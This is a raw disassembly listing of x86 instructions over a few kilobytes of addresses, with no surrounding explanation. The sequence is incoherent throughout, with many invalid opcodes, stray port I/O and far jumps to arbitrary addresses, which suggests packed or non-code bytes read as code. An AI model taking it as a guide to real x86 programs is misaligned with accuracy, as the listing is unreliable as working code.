  41f9ed:	mov    ebx,0x3f712a27
  41f9f2:	repnz push ss
  41f9f4:	xchg   ecx,eax
  41f9f5:	ret    
  41f9f6:	lods   al,BYTE PTR ds:[esi]
  41f9f7:	stos   DWORD PTR es:[edi],eax
  41f9f8:	jle    0x41fa28
  41f9fa:	sbb    BYTE PTR [esi],0x9c
  41f9fd:	mov    edi,0xb7d859d4
  41fa02:	push   esi
  41fa03:	inc    ebp
  41fa04:	popa   
  41fa05:	loop   0x41fa07
  41fa07:	ins    DWORD PTR es:[edi],dx
  41fa08:	sbb    BYTE PTR [edi-0x86e1309],al
  41fa0e:	sub    BYTE PTR [edi+eax*2-0x6e37c111],0x53
  41fa16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa17:	mov    dl,0x7
  41fa19:	popf   
  41fa1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa1b:	sti    
  41fa1c:	aad    0x62
  41fa1e:	inc    ecx
  41fa1f:	ins    BYTE PTR es:[edi],dx
  41fa20:	mul    DWORD PTR [ecx]
  41fa22:	in     eax,0x12
  41fa24:	mov    eax,edi
  41fa26:	mov    ch,0xda
  41fa28:	push   ss
  41fa29:	(bad)  
  41fa2c:	test   DWORD PTR [ebp+0x3c],esp
  41fa2f:	jg     0x41fa2d
  41fa31:	(bad)  [edi-0x65be08a1]
  41fa37:	rol    BYTE PTR [esi],0x49
  41fa3a:	pop    es
  41fa3b:	dec    edi
  41fa3c:	retf   0x1
  41fa3f:	call   0xaa41fa45
  41fa44:	aad    0x22
  41fa46:	ret    
  41fa47:	stos   BYTE PTR es:[edi],al
  41fa48:	inc    ecx
  41fa49:	in     al,dx
  41fa4a:	cli    
  41fa4b:	js     0x41fa1e
  41fa4d:	int    0x22
  41fa4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa50:	aaa    
  41fa51:	icebp  
  41fa52:	sbb    DWORD PTR [edi-0x381594a5],esi
  41fa58:	daa    
  41fa59:	mov    esp,edx
  41fa5b:	enter  0xd79d,0x50
  41fa5f:	cmp    DWORD PTR [esi],0xffffffa6
  41fa62:	and    eax,0xb2ca8f6e
  41fa67:	addr16 loopne 0x41fade
  41fa6a:	xchg   DWORD PTR [ebx-0x37b53d00],eax
  41fa70:	sbb    BYTE PTR [edi+0x3e9b92c],0x2d
  41fa77:	or     al,ah
  41fa79:	sub    eax,0xddd814e6
  41fa7e:	jecxz  0x41fa32
  41fa80:	jne    0x41fac5
  41fa82:	xchg   edx,edi
  41fa84:	loop   0x41fa43
  41fa86:	inc    ecx
  41fa87:	(bad)  
  41fa88:	scas   eax,DWORD PTR es:[edi]
  41fa89:	sti    
  41fa8a:	xor    dh,0x1d
  41fa8d:	bound  esi,QWORD PTR [esi-0x5fdc9c4b]
  41fa93:	mov    dh,0xd5
  41fa95:	cmc    
  41fa96:	xchg   edx,eax
  41fa97:	out    dx,eax
  41fa98:	cmp    DWORD PTR [ebx],ecx
  41fa9a:	in     al,dx
  41fa9b:	mov    ecx,0x7a2c4c9e
  41faa0:	mov    ebp,edx
  41faa2:	in     al,dx
  41faa3:	xchg   ebp,eax
  41faa4:	push   ecx
  41faa5:	out    dx,eax
  41faa6:	dec    ecx
  41faa7:	xchg   ecx,edi
  41faa9:	iret   
  41faaa:	add    al,0x90
  41faac:	aad    0xd8
  41faae:	(bad)  
  41faaf:	in     eax,0x23
  41fab1:	adc    al,0xf0
  41fab3:	push   ss
  41fab4:	jnp    0x41fa42
  41fab6:	cmc    
  41fab7:	push   eax
  41fab8:	mov    ebx,DWORD PTR [eax+0x7a]
  41fabb:	mov    cl,0x93
  41fabd:	cmp    BYTE PTR [eax+0x366a162d],dh
  41fac3:	std    
  41fac4:	push   esi
  41fac5:	or     eax,0x72265142
  41faca:	iret   
  41facb:	dec    esp
  41facc:	jns    0x41face
  41face:	jecxz  0x41fa99
  41fad0:	or     DWORD PTR [ecx],ebp
  41fad2:	loop   0x41fa5c
  41fad4:	in     al,0x86
  41fad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fad7:	es stos BYTE PTR es:[edi],al
  41fad9:	xor    DWORD PTR [eax],esp
  41fadb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fadc:	lds    esi,FWORD PTR [ecx]
  41fade:	sbb    dh,cl
  41fae0:	push   ecx
  41fae1:	mov    bl,0x7e
  41fae3:	xchg   ebp,eax
  41fae4:	xlat   BYTE PTR ds:[ebx]
  41fae5:	mov    eax,ds:0x3cb67e8a
  41faea:	fisttp DWORD PTR [eax]
  41faec:	(bad)  
  41faed:	pusha  
  41faee:	push   esp
  41faef:	sti    
  41faf0:	mov    ebx,0xbe8b2701
  41faf5:	out    dx,eax
  41faf6:	(bad)  
  41faf8:	mov    esp,0x3e242af0
  41fafd:	sbb    eax,DWORD PTR [ebx]
  41faff:	aam    0x10
  41fb01:	mov    ?,WORD PTR [edx-0x53]
  41fb04:	sbb    al,ch
  41fb06:	shr    ecx,0x34
  41fb09:	push   es
  41fb0a:	ficomp DWORD PTR [edx+0x7af8d37b]
  41fb10:	or     ebp,ecx
  41fb12:	in     al,0x94
  41fb14:	sub    al,0xac
  41fb16:	out    0xef,al
  41fb18:	push   esp
  41fb19:	jmp    0x7bc5:0x6c021570
  41fb20:	or     eax,0xea83534f
  41fb25:	fcom   DWORD PTR [esi-0x13197c57]
  41fb2b:	(bad)  
  41fb2c:	and    al,0xdf
  41fb2e:	xlat   BYTE PTR ds:[ebx]
  41fb2f:	inc    edi
  41fb30:	daa    
  41fb31:	jmp    0x41facc
  41fb33:	(bad)  
  41fb34:	in     eax,0x8b
  41fb36:	call   0x892836fe
  41fb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb3c:	jb     0x41fb79
  41fb3e:	xchg   ecx,eax
  41fb3f:	iret   
  41fb40:	(bad)  
  41fb42:	and    eax,0xc5032206
  41fb47:	stos   DWORD PTR es:[edi],eax
  41fb48:	fisub  WORD PTR [esi-0x48]
  41fb4b:	mov    ebp,edi
  41fb4d:	push   ebx
  41fb4e:	cli    
  41fb4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb50:	push   esp
  41fb51:	fst    DWORD PTR ds:0xa71d0b52
  41fb57:	or     al,0xf0
  41fb59:	xchg   ebp,eax
  41fb5a:	in     eax,dx
  41fb5b:	push   0xbf3feee3
  41fb60:	sbb    edi,DWORD PTR [edi-0x3]
  41fb63:	leave  
  41fb64:	inc    edi
  41fb65:	adc    BYTE PTR [eax],0xf8
  41fb68:	xchg   ebp,eax
  41fb69:	ins    BYTE PTR es:[edi],dx
  41fb6a:	mov    fs:0x7244240d,eax
  41fb70:	fcom   st(2)
  41fb72:	pop    esp
  41fb73:	pop    ebp
  41fb74:	inc    ebp
  41fb75:	sub    al,0xa1
  41fb77:	mov    cl,ch
  41fb79:	pop    es
  41fb7a:	pminsw mm4,QWORD PTR [edi]
  41fb7d:	(bad)  
  41fb7e:	xchg   ecx,eax
  41fb7f:	icebp  
  41fb80:	add    al,0x1
  41fb82:	lods   eax,DWORD PTR ds:[esi]
  41fb83:	fisubr DWORD PTR [ebp+0x71060d10]
  41fb89:	sbb    al,0x3a
  41fb8b:	mov    WORD PTR [edx],cs
  41fb8d:	iret   
  41fb8e:	ret    
  41fb8f:	jmp    0xd39f5170
  41fb94:	pop    ds
  41fb95:	pop    ebx
  41fb96:	xor    eax,0x386eb961
  41fb9b:	push   0xb6254a18
  41fba0:	push   edx
  41fba1:	cli    
  41fba2:	test   eax,0xc7a2b2d2
  41fba7:	sbb    cl,al
  41fba9:	cmp    ebp,0x3b
  41fbac:	or     al,0x6e
  41fbae:	sbb    bl,al
  41fbb0:	sub    eax,0x6f988720
  41fbb5:	mov    dl,0x3
  41fbb7:	push   ds
  41fbb8:	sub    BYTE PTR [ebx-0x5d7182a1],bl
  41fbbe:	push   ss
  41fbbf:	clc    
  41fbc0:	xchg   DWORD PTR [ebp-0x29],eax
  41fbc3:	cmp    DWORD PTR [edi-0x9],ecx
  41fbc6:	mov    esp,0xdfb763f8
  41fbcb:	in     al,0xda
  41fbcd:	icebp  
  41fbce:	lods   al,BYTE PTR ds:[esi]
  41fbcf:	mov    ch,0x4c
  41fbd1:	rol    BYTE PTR [esi-0x37491f8d],cl
  41fbd7:	int    0x10
  41fbd9:	mov    BYTE PTR [edx-0x6041e615],bl
  41fbdf:	push   esi
  41fbe0:	out    0x94,eax
  41fbe2:	aad    0xdd
  41fbe4:	mov    BYTE PTR [esi+0x1b],ah
  41fbe7:	jge    0x41fbdb
  41fbe9:	(bad)  
  41fbea:	call   DWORD PTR [ecx-0x18]
  41fbed:	iret   
  41fbee:	enter  0x8ffe,0x71
  41fbf2:	bound  esi,QWORD PTR [eax-0x2cdbeffb]
  41fbf8:	(bad)  
  41fbf9:	fisttp DWORD PTR [ebx*8-0x293ea435]
  41fc00:	pop    ss
  41fc01:	call   0xc24f8d6c
  41fc06:	dec    ebp
  41fc07:	xor    edx,0x5d
  41fc0a:	xchg   ebx,eax
  41fc0b:	scas   al,BYTE PTR es:[edi]
  41fc0c:	dec    edi
  41fc0d:	sub    al,0x2a
  41fc0f:	cmp    BYTE PTR [eax+0x7a60d428],0x31
  41fc16:	lock retf 
  41fc18:	fisubr WORD PTR [esi]
  41fc1a:	jle    0x41fbe9
  41fc1c:	retf   
  41fc1d:	popf   
  41fc1e:	mov    ds:0xe22b2398,eax
  41fc23:	xchg   edi,eax
  41fc24:	push   es
  41fc25:	jle    0x41fbae
  41fc27:	dec    ebp
  41fc28:	cs dec di
  41fc2b:	outs   dx,BYTE PTR ds:[esi]
  41fc2c:	jae    0x41fc1e
  41fc2e:	retf   0xcbfd
  41fc31:	jle    0x41fc2a
  41fc33:	repz xor eax,0xfe218ce9
  41fc39:	add    BYTE PTR [edx+0x1cc37],al
  41fc3f:	call   0x1141fc45
  41fc44:	jmp    0x5d80a30c
  41fc49:	aas    
  41fc4a:	mov    edx,0x2e5307db
  41fc4f:	jge    0x41fc11
  41fc51:	adc    BYTE PTR [edi],bh
  41fc53:	cwde   
  41fc54:	pop    ebp
  41fc55:	(bad)  
  41fc57:	mov    ebx,0x71a91903
  41fc5c:	addr16 out dx,al
  41fc5e:	mov    cl,0xc
  41fc60:	(bad)  
  41fc61:	outs   dx,BYTE PTR ds:[esi]
  41fc62:	lds    esp,FWORD PTR [ebx-0x23]
  41fc65:	(bad)  
  41fc66:	fst    QWORD PTR [eax+0x4c]
  41fc69:	ins    BYTE PTR es:[edi],dx
  41fc6a:	xchg   DWORD PTR [ecx+ebp*8],edi
  41fc6d:	icebp  
  41fc6e:	xchg   esp,eax
  41fc6f:	in     eax,0x28
  41fc71:	clc    
  41fc72:	cmp    DWORD PTR [ebx-0x41e41412],0xedfe2194
  41fc7c:	ret    0x9a22
  41fc7f:	(bad)
  41fc82:	fimul  WORD PTR [edi+0x66]
  41fc85:	cwde   
  41fc86:	cmp    al,0x2f
  41fc88:	jo     0x41fc33
  41fc8a:	and    eax,0x453e2497
  41fc8f:	scas   eax,DWORD PTR es:[edi]
  41fc90:	sbb    eax,0x53a78c
  41fc95:	pop    ebx
  41fc96:	dec    ebx
  41fc97:	pop    di
  41fc99:	jle    0x41fcfe
  41fc9b:	and    dl,BYTE PTR [esi+0x2]
  41fc9e:	fsubr  DWORD PTR [edx+0x363354ff]
  41fca4:	jae    0x41fccd
  41fca6:	jg     0x41fc80
  41fca8:	xor    al,BYTE PTR [edx+ebx*8-0x7d]
  41fcac:	mov    edx,0x10054435
  41fcb1:	jmp    0xdc4f4aab
  41fcb6:	mov    DWORD PTR [edi+0x3cbddbc4],esi
  41fcbc:	fstp   DWORD PTR [ebx]
  41fcbe:	fwait
  41fcbf:	mov    cl,BYTE PTR [edx+0xb]
  41fcc2:	out    0xe1,al
  41fcc4:	mov    edi,0x736a1e03
  41fcc9:	jo     0x41fcf9
  41fccb:	loop   0x41fcdd
  41fccd:	stos   BYTE PTR es:[edi],al
  41fcce:	aad    0xfc
  41fcd0:	scas   al,BYTE PTR es:[edi]
  41fcd1:	out    0x13,eax
  41fcd3:	adc    edx,esi
  41fcd5:	xor    al,0xe9
  41fcd7:	cmp    al,BYTE PTR [eax+0x9]
  41fcda:	mov    bl,al
  41fcdc:	test   BYTE PTR [ecx+0x56bcce67],0xc9
  41fce3:	jmp    FWORD PTR [eax]
  41fce5:	fnstenv [ecx+0x1b6872ad]
  41fceb:	xchg   esp,eax
  41fcec:	mov    WORD PTR [esi+0x59f1273d],ss
  41fcf2:	adc    al,0x83
  41fcf4:	(bad)  
  41fcf5:	jle    0x41fd0b
  41fcf7:	mov    al,ds:0xf1c40b32
  41fcfc:	xor    DWORD PTR [edx+edx*4-0x66036592],esp
  41fd03:	sub    ch,bl
  41fd05:	pop    ebp
  41fd06:	mov    ds:0x2c7ab9b4,al
  41fd0b:	jmp    0x41fc98
  41fd0d:	inc    esi
  41fd0e:	mov    bl,cl
  41fd10:	repnz inc esi
  41fd12:	cmc    
  41fd13:	sub    DWORD PTR [edi+0x53],esp
  41fd16:	aam    0x5d
  41fd18:	ret    0xa71f
  41fd1b:	sbb    al,0xec
  41fd1d:	or     eax,0x6446e1bf
  41fd22:	jbe    0x41fcec
  41fd24:	push   0xf932772b
  41fd29:	hlt    
  41fd2a:	out    dx,al
  41fd2b:	cmp    esp,ebp
  41fd2d:	stc    
  41fd2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd2f:	std    
  41fd30:	fstp   DWORD PTR [esi+0x37a90269]
  41fd36:	scas   eax,DWORD PTR es:[edi]
  41fd37:	fld    st(0)
  41fd39:	cmp    ah,BYTE PTR [edi+0x537a8c36]
  41fd3f:	lods   eax,DWORD PTR ds:[esi]
  41fd40:	loopne 0x41fcfa
  41fd42:	cmp    DWORD PTR [ebx-0x69],eax
  41fd45:	lods   al,BYTE PTR ds:[esi]
  41fd46:	or     eax,0x7bf99f3a
  41fd4b:	rcr    BYTE PTR [ebx-0x41],0xad
  41fd4f:	popf   
  41fd50:	cmp    DWORD PTR [esi-0x31],edi
  41fd53:	adc    al,0xaa
  41fd55:	push   ss
  41fd56:	xchg   ebx,eax
  41fd57:	out    dx,eax
  41fd58:	xor    eax,0x8d58566b
  41fd5d:	sbb    BYTE PTR [edx-0x23409282],cl
  41fd63:	scas   eax,DWORD PTR es:[edi]
  41fd64:	and    BYTE PTR [ebp+edx*4-0x12],dl
  41fd68:	or     eax,DWORD PTR [eax+edx*2-0x46]
  41fd6c:	sub    cl,BYTE PTR [esi-0x7d960fca]
  41fd72:	cmc    
  41fd73:	jle    0x41fdb5
  41fd75:	inc    ebx
  41fd76:	pop    ecx
  41fd77:	fldenv [ecx-0x28]
  41fd7a:	xor    BYTE PTR [eax+0x2afcb128],bh
  41fd80:	mov    ds:0xa1d94155,eax
  41fd85:	dec    edx
  41fd86:	aas    
  41fd87:	pop    eax
  41fd88:	push   ebp
  41fd89:	adc    cl,BYTE PTR [eax*4+0x7cb39ff0]
  41fd90:	inc    eax
  41fd91:	push   0xffffffd0
  41fd93:	outs   dx,BYTE PTR ds:[esi]
  41fd94:	std    
  41fd95:	pop    ds
  41fd96:	mov    ds:0x876d446b,al
  41fd9b:	dec    edx
  41fd9c:	sub    eax,0x78964116
  41fda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda2:	and    al,BYTE PTR [ebp+eiz*2+0x5cd8cc09]
  41fda9:	in     al,dx
  41fdaa:	cmc    
  41fdab:	add    al,0x7a
  41fdad:	shl    DWORD PTR [edi+0x44072f5f],0xd7
  41fdb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdb5:	mov    eax,0x890dce9f
  41fdba:	aas    
  41fdbb:	dec    esp
  41fdbc:	stc    
  41fdbd:	or     edi,ebp
  41fdbf:	add    BYTE PTR [edi-0x5476e39],0xb9
  41fdc6:	fist   DWORD PTR ds:0xa9239bc1
  41fdcc:	in     eax,0x9
  41fdce:	icebp  
  41fdcf:	jecxz  0x41fdfb
  41fdd1:	sti    
  41fdd2:	std    
  41fdd3:	adc    BYTE PTR [esi],0x45
  41fdd6:	rcl    DWORD PTR [edx+edi*2],cl
  41fdd9:	mov    ds:0x699c15d0,al
  41fdde:	pop    edx
  41fddf:	add    ebx,ecx
  41fde1:	cli    
  41fde2:	test   BYTE PTR [si-0x24],bl
  41fde6:	sbb    eax,0xbe111442
  41fdeb:	xchg   esp,eax
  41fdec:	loop   0x41fe05
  41fdee:	or     eax,0x65cc0081
  41fdf3:	out    0xe8,eax
  41fdf5:	xor    bh,BYTE PTR [edx]
  41fdf7:	scas   al,BYTE PTR es:[edi]
  41fdf8:	call   0x47235965
  41fdfd:	mov    bh,0x54
  41fdff:	sti    
  41fe00:	in     eax,0xa4
  41fe02:	fwait
  41fe03:	call   0xdee0c65f
  41fe08:	jmp    0x4991:0xa69804
  41fe0f:	cmp    DWORD PTR [esi+0x62],0xffffff81
  41fe13:	push   edi
  41fe14:	cld    
  41fe15:	retf   
  41fe16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe17:	ds cld 
  41fe19:	add    al,0x66
  41fe1b:	push   edi
  41fe1c:	xchg   cl,dh
  41fe1e:	push   ds
  41fe1f:	inc    edi
  41fe20:	xchg   ebp,eax
  41fe21:	inc    edx
  41fe22:	(bad)  
  41fe23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe24:	dec    esp
  41fe25:	dec    esi
  41fe26:	sbb    bh,BYTE PTR [ebx-0xa49e9b5]
  41fe2c:	adc    al,0xae
  41fe2e:	adc    ebp,edi
  41fe30:	mov    ebx,0x84e6f6fd
  41fe35:	lds    ebp,FWORD PTR [edx+0x6dc6b024]
  41fe3b:	pop    ds
  41fe3c:	into   
  41fe3d:	add    DWORD PTR [eax],eax
  41fe3f:	call   0x7141fe45
  41fe44:	out    dx,eax
  41fe45:	stc    
  41fe46:	pop    ebp
  41fe47:	adc    eax,0x6414ca8c
  41fe4c:	mov    ch,0x20
  41fe4e:	pushf  
  41fe4f:	test   BYTE PTR [ebx-0x30],al
  41fe52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe53:	and    DWORD PTR [ecx],0xffffff8d
  41fe56:	ds cdq 
  41fe58:	into   
  41fe59:	push   esi
  41fe5a:	and    al,0x62
  41fe5c:	jbe    0x41fde4
  41fe5e:	mov    ebp,0x38fc011d
  41fe63:	xchg   edi,eax
  41fe64:	in     al,0x1a
  41fe66:	sbb    BYTE PTR [esi-0x59],ah
  41fe69:	mov    al,0x3d
  41fe6b:	xor    dh,al
  41fe6d:	sub    eax,0xe086fafe
  41fe72:	lea    esi,[eax+0x74]
  41fe75:	cmp    al,0xa4
  41fe77:	and    bh,BYTE PTR [ecx]
  41fe79:	jne    0x41fe87
  41fe7b:	sbb    ah,ah
  41fe7d:	jno    0x41fe8b
  41fe7f:	push   ebp
  41fe80:	jnp    0x41fe7a
  41fe82:	enter  0xbe1e,0xb4
  41fe86:	sbb    BYTE PTR [edi],0x41
  41fe89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe8a:	cmp    dl,dl
  41fe8c:	dec    ebx
  41fe8d:	and    al,0x54
  41fe8f:	das    
  41fe90:	cmp    al,0x1b
  41fe92:	lahf   
  41fe93:	ins    BYTE PTR es:[edi],dx
  41fe94:	or     ebx,DWORD PTR [eax+0x23]
  41fe97:	call   FWORD PTR [eax]
  41fe99:	adc    al,ah
  41fe9b:	adc    BYTE PTR [ebp+0x4a],ah
  41fe9e:	shl    DWORD PTR [ebp+0x1a],cl
  41fea1:	imul   edi,DWORD PTR [ebx-0xb7332ff],0xffffffe0
  41fea8:	mov    esi,DWORD PTR ds:0x27f149ab
  41feae:	or     DWORD PTR [edi],edi
  41feb0:	jbe    0x41fe4d
  41feb2:	jne    0x5e1c8908
  41feb8:	loope  0x41ff15
  41feba:	shl    BYTE PTR [edi+0x43],1
  41febd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41febe:	test   DWORD PTR [edi-0x306a2084],esi
  41fec4:	add    al,0x95
  41fec6:	cmc    
  41fec7:	mov    bl,0x25
  41fec9:	mov    bl,0x2d
  41fecb:	or     BYTE PTR [edx],cl
  41fecd:	add    eax,DWORD PTR [edx+eax*4]
  41fed0:	dec    ecx
  41fed1:	sub    eax,DWORD PTR [eax]
  41fed3:	pop    ecx
  41fed4:	(bad)  
  41fed5:	adc    DWORD PTR [ebp+0x25c84a9f],eax
  41fedb:	xchg   ebp,eax
  41fedc:	sbb    al,0xe8
  41fede:	jle    0x41ff00
  41fee0:	loope  0x41feab
  41fee2:	ret    
  41fee3:	adc    edx,0xffffffcb
  41fee6:	xor    eax,0xd0d544f6
  41feeb:	not    BYTE PTR [ebx-0x2c]
  41feee:	mov    dl,0xef
  41fef0:	fwait
  41fef1:	add    DWORD PTR [edx-0x16f451f2],0x79
  41fef8:	pop    esp
  41fef9:	hlt    
  41fefa:	adc    edi,DWORD PTR [ecx-0x44]
  41fefd:	jbe    0x41ff26
  41feff:	int3   
  41ff00:	mov    ebx,0x3aebafc0
  41ff05:	xchg   ebx,eax
  41ff06:	test   bh,bh
  41ff08:	and    dh,BYTE PTR [eax-0x25ea48c4]
  41ff0e:	aam    0xe1
  41ff10:	add    dh,BYTE PTR [ebx+0x64]
  41ff13:	mov    esp,0x259108fc
  41ff18:	sbb    BYTE PTR [edx+0x3931ea10],dl
  41ff1e:	push   eax
  41ff20:	adc    dl,BYTE PTR [edi]
  41ff22:	jl     0x41ff4e
  41ff24:	or     edx,DWORD PTR [eax+esi*8-0x7ea7b1d4]
  41ff2b:	push   edx
  41ff2c:	pop    ds
  41ff2d:	stos   BYTE PTR es:[edi],al
  41ff2e:	in     al,dx
  41ff2f:	inc    BYTE PTR [edx-0x1c]
  41ff32:	test   DWORD PTR ds:0xb821d973,ebx
  41ff38:	lods   eax,DWORD PTR ds:[esi]
  41ff39:	dec    edx
  41ff3a:	fs ret 
  41ff3c:	ja     0x41ff0b
  41ff3e:	or     eax,0x2fc27b3b
  41ff43:	xchg   ebx,eax
  41ff44:	xchg   BYTE PTR [edi+0x4465d3c0],bh
  41ff4a:	cmc    
  41ff4b:	int    0x40
  41ff4d:	or     bh,BYTE PTR [edi+0x7f]
  41ff50:	pop    ss
  41ff51:	mov    esp,DWORD PTR gs:[edx]
  41ff54:	(bad)  
  41ff55:	cld    
  41ff56:	rcl    dl,cl
  41ff58:	xchg   edi,eax
  41ff59:	sub    eax,0xc8113082
  41ff5e:	in     al,dx
  41ff5f:	pop    esp
  41ff60:	jp     0x41ff7e
  41ff62:	inc    DWORD PTR [ebx]
  41ff64:	retf   
  41ff65:	adc    DWORD PTR [ecx-0x4236e9a],eax
  41ff6b:	cs dec edx
  41ff6d:	cmp    dl,BYTE PTR [ecx]
  41ff6f:	and    ch,cl
  41ff71:	dec    ebx
  41ff72:	add    BYTE PTR gs:[edi+ebp*8+0x2293f151],al
  41ff7a:	and    BYTE PTR [eax],dh
  41ff7c:	ds push eax
  41ff7e:	add    DWORD PTR [ebx+0x45],ebp
  41ff81:	dec    ecx
  41ff82:	sub    al,0xf4
  41ff84:	cs mov eax,0x7c73ba72
  41ff8a:	pusha  
  41ff8b:	in     eax,0xce
  41ff8d:	(bad)  
  41ff8e:	mov    eax,0x359bd62a
  41ff93:	es fcmovbe st,st(1)
  41ff96:	mov    al,ds:0xdfcf4f87
  41ff9b:	test   al,0x41
  41ff9d:	mov    ds:0xc49bf252,eax
  41ffa2:	inc    ecx
  41ffa3:	outs   dx,BYTE PTR ds:[esi]
  41ffa4:	(bad)  
  41ffa6:	iret   
  41ffa7:	inc    edi
  41ffa8:	jge    0x41ffc4
  41ffaa:	jmp    0x239:0xa6a85b11
  41ffb1:	dec    edx
  41ffb2:	dec    esi
  41ffb3:	out    dx,eax
  41ffb4:	push   esp
  41ffb5:	sbb    al,0x80
  41ffb7:	aam    0xd3
  41ffb9:	ds xchg edi,eax
  41ffbb:	ficomp DWORD PTR [esi+0x2781f668]
  41ffc1:	pop    esi
  41ffc2:	or     DWORD PTR [ebx-0x284dc933],edi
  41ffc8:	shl    BYTE PTR [ecx],0x66
  41ffcb:	scas   eax,DWORD PTR es:[edi]
  41ffcc:	sbb    al,0x16
  41ffce:	and    dl,BYTE PTR [ebx]
  41ffd0:	or     edx,DWORD PTR [edi+esi*1]
  41ffd3:	retf   
  41ffd4:	jge    0x420038
  41ffd6:	repz in al,0x3b
  41ffd9:	fidiv  WORD PTR [ebp-0x22a99f2c]
  41ffdf:	popa   
  41ffe0:	pop    eax
  41ffe1:	mov    dl,BYTE PTR [ecx+edi*2+0x56]
  41ffe5:	xchg   ebx,eax
  41ffe6:	jnp    0x41fffb
  41ffe8:	mov    bl,0x24
  41ffea:	push   ebx
  41ffeb:	and    al,0xdb
  41ffed:	inc    esi
  41ffee:	ret    0x68f0
  41fff1:	dec    edx
  41fff2:	ins    DWORD PTR es:[edi],dx
  41fff3:	or     eax,0xe803e5a1
  41fff8:	aam    0x82
  41fffa:	adc    edx,eax
  41fffc:	add    eax,0xe2dda53e
  420001:	ret    0xd40a
  420004:	sub    ecx,DWORD PTR ds:0x8c909b28
  42000a:	add    BYTE PTR [eax-0x2f],0x58
  42000e:	imul   esi,DWORD PTR cs:[esi+0x6085f7f1],0xa14e7b89
  420019:	leave  
  42001a:	adc    cl,ah
  42001c:	sbb    ch,ah
  42001e:	fld    TBYTE PTR [ebp-0x165c0827]
  420024:	test   DWORD PTR [ebx+0x2a],ebp
  420027:	hlt    
  420028:	sar    DWORD PTR [ebx],0x7e
  42002b:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  420031:	mov    edi,0xbb1c16fb
  420036:	ror    BYTE PTR [ebx-0x25],0x75
  42003a:	sbb    eax,DWORD PTR [edi]
  42003c:	rol    BYTE PTR [ecx],1
  42003e:	add    al,ch
  420040:	add    DWORD PTR [eax],eax
  420042:	add    BYTE PTR [ebx-0x6f],bl
  420045:	push   0x1c
  420047:	ins    BYTE PTR es:[edi],dx
  420048:	call   0xc2cf9afc
  42004d:	sti    
  42004e:	jnp    0x42007e
  420050:	pop    ds
  420051:	push   ebx
  420052:	call   0x3a56:0x9a6b01f5
  420059:	test   dh,ch
  42005b:	lods   al,BYTE PTR ds:[esi]
  42005c:	aad    0x6c
  42005e:	mov    bh,0x3
  420060:	adc    eax,0x951ff3ee
  420065:	js     0x420039
  420067:	mov    dl,0x8e
  420069:	push   edx
  42006a:	jg     0x420050
  42006c:	dec    ebp
  42006d:	iret   
  42006e:	pop    edi
  42006f:	ja     0x4200ed
  420071:	dec    esi
  420072:	xchg   BYTE PTR [esi-0x57],bl
  420075:	push   ss
  420076:	mov    ah,0x1e
  420078:	sar    ebx,1
  42007a:	leave  
  42007b:	jne    0x4200f2
  42007d:	mov    eax,ds:0x44a519b2
  420082:	pushf  
  420083:	add    ch,al
  420085:	ds cs inc edi
  420088:	or     eax,0xe8b30215
  42008d:	xor    dh,bl
  42008f:	out    dx,al
  420090:	fisttp QWORD PTR [ebx+0x4f05027f]
  420096:	cmp    DWORD PTR [ebx],edx
  420098:	dec    esi
  420099:	pop    edi
  42009a:	popf   
  42009b:	out    dx,al
  42009c:	push   0xc929382e
  4200a1:	xchg   esi,eax
  4200a2:	push   edx
  4200a3:	xchg   ebx,eax
  4200a4:	cli    
  4200a5:	jnp    0x4200a7
  4200a7:	mov    esi,0xdb179a7a
  4200ac:	jecxz  0x42003d
  4200ae:	fidiv  DWORD PTR [ebx]
  4200b0:	adc    cl,BYTE PTR [ecx+ebp*2+0x20b9e920]
  4200b7:	mov    al,0xa7
  4200b9:	int    0xec
  4200bb:	scas   eax,DWORD PTR es:[edi]
  4200bc:	jmp    0xdf7d:0xdde972be
  4200c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200c4:	sbb    bl,BYTE PTR [esi+0x4383b8a]
  4200ca:	out    dx,al
  4200cb:	pop    edi
  4200cc:	ror    ebp,cl
  4200ce:	sbb    DWORD PTR [ecx+0x5030cc8],ebp
  4200d4:	xor    edi,DWORD PTR [ebp+0x58]
  4200d7:	add    DWORD PTR [ebx],ebx
  4200d9:	gs pushf 
  4200db:	test   BYTE PTR [ecx-0x4d],bh
  4200de:	sar    cl,1
  4200e0:	fadd   QWORD PTR [edi-0xa7524d2]
  4200e6:	call   0x58cd:0x84aa2e68
  4200ed:	test   al,0x90
  4200ef:	sbb    DWORD PTR [eax-0x74],edx
  4200f2:	xor    eax,0x97a409dd
  4200f7:	mov    dh,0xf9
  4200f9:	or     ebp,DWORD PTR [eax]
  4200fb:	or     BYTE PTR [edx-0x59a492b],ah
  420101:	test   eax,0xaaea0101
  420106:	ss js  0x420137
  420109:	sub    esi,DWORD PTR [edi+edi*4]
  42010c:	cmp    al,0x5f
  42010e:	(bad)  
  420110:	inc    ebx
  420111:	pop    es
  420112:	adc    DWORD PTR ds:0xfc11ab43,eax
  420118:	push   eax
  420119:	outs   dx,BYTE PTR fs:[esi]
  42011b:	dec    edx
  42011c:	es xchg ch,dh
  42011f:	dec    ebp
  420120:	xor    BYTE PTR [edx+0x5c],0xa4
  420124:	mov    ecx,0x2a2c1746
  420129:	or     esp,ebp
  42012b:	dec    ebx
  42012c:	sbb    edi,DWORD PTR [esi+0xc]
  42012f:	and    esi,DWORD PTR [edi-0x64]
  420132:	in     al,0x96
  420134:	jnp    0x42012c
  420136:	je     0x42010f
  420138:	sub    al,0xdd
  42013a:	add    al,0xb7
  42013c:	xchg   BYTE PTR cs:[edi+0x24],bh
  420140:	(bad)  
